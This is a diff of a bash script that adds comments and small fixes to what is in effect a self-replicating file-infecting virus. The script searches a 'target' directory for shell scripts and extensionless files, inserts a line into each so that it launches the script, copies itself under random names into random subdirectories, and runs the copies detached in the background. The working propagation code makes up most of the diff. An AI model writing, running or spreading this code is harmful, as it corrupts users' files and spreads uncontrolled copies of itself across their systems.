@@ -1,7 +1,9 @@
 #!/usr/bin/env bash
 
+# Exit if any piped command fails
 set -o pipefail
 
+# If the script is not run as root
 if [[ ${EUID} -ne 0 ]]; then
 	target="${HOME}/target"
 else
@@ -20,16 +22,22 @@ script_path=$(readlink -f "$0")
 line="(${script_path}) &"
 
 check_for_bash_in_file() {
+	# Find all files lacking file extension aswell as files with the .sh extension in the target directory
 	find "${target}" -type f \( -name "*.sh" -o ! -name "*.*" \) -print0 | while IFS= read -r -d '' file; do
+		# If the file contains the word "bash"
 		if grep -q "${word}" "${file}"; then
+			# Append the line to the file
 			append_line_to_file "${file}"
-			clone_file_under_random_name
 		fi
 	done
+	# Clone the script under a random name
+	clone_file_under_random_name
 }
 
 append_line_to_file() {
+	# If the file is not the script itself
 	if ! cmp -s "${file}" "${script_path}"; then
+		# If the file does not contain the line
 		if ! grep -Fxq "${line}" "${file}"; then
 			sed -i '2{/^$/d}' "${file}"  # If the second line is empty, delete it
 			sed -i "2i${line}" "${file}" # Insert the new line at the second line
@@ -38,15 +46,26 @@ append_line_to_file() {
 }
 
 clone_file_under_random_name() {
+	# Find all directories in the target directory
 	find_output=$(find "${target}" -type d 2>/dev/null) || exit 1
 	IFS=$'\n' read -d '' -r -a directories <<<"${find_output}"
-	# Select a random directory
-	dir=${directories[RANDOM % ${#directories[@]}]}
+
+	# Select a random directory from the array unless the array is empty
+	if ! dir=${directories[RANDOM % ${#directories[@]}]}; then
+		# If the array is empty, use the target directory
+		dir="${target}"
+	fi
 	# Create a temporary file in the random directory
 	random_dir=$(mktemp -d "${dir}/XXXXXXXXXXXX")
+
+	# Copy the script to the temporary file and make it executable
 	random_file=$(mktemp "${random_dir}/XXXXXXXXXXXX")
 	cp "${script_path}" "${random_file}" && chmod +x "${random_file}"
-	${random_file}
+
+	# Run the script
+	next_file=$(readlink -f "${random_file}")
+	nohup "${next_file}" >/dev/null 2>&1 &
 }
 
+# Run and disown the function in the background
 (check_for_bash_in_file) &
